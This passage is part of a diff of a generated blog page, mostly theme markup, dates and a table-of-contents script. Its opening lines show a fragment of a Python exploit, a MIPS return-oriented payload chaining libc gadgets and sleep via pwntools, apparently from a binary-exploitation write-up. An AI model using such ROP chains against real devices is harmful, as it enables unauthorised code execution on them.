 pay <span class="token operator">+=</span> b<span class="token string">'1111'</span>                    <span class="token comment" spellcheck="true">#s0</span>
 pay <span class="token operator">+=</span> b<span class="token string">'2222'</span>                    <span class="token comment" spellcheck="true">#s1</span>
-pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>jr_t9_jr_ra<span class="token operator">+</span>libc_base<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#s2 - &gt; set a0 </span>
+pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>jr_t9_jr_ra<span class="token operator">+</span>libc_base<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#s2 - > set a0 </span>
 pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>sleep<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#s3</span>
 pay <span class="token operator">+=</span> b<span class="token string">'5555'</span>                    <span class="token comment" spellcheck="true">#s4</span>
 pay <span class="token operator">+=</span> p32<span class="token punctuation">(</span>jr_a1<span class="token operator">+</span>libc_base<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#s5</span>
@@ -6308,7 +6403,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         repo: 'JackHCC.github.io',
         owner: 'JackHCC',
         admin: "JackHCC",
-        id: '2021-08-18T23-23-30',
+        id: '2021-08-20T23-23-30',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -6350,7 +6445,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-24
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-23
                         </span>
                         <span class="publish-author">
                             
@@ -6399,7 +6494,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-19
                             </span>
                         <span class="publish-author">
                             
@@ -6457,6 +6552,100 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 </style>
 
 
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="https://cdn.jsdelivr.net/gh/JackHCC/JackHCC.github.io/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('4'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
     
 
 </main>
@@ -6474,7 +6663,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1254k</span>&nbsp;字
+                class="white-color">1257.5k</span>&nbsp;字
             
             
             
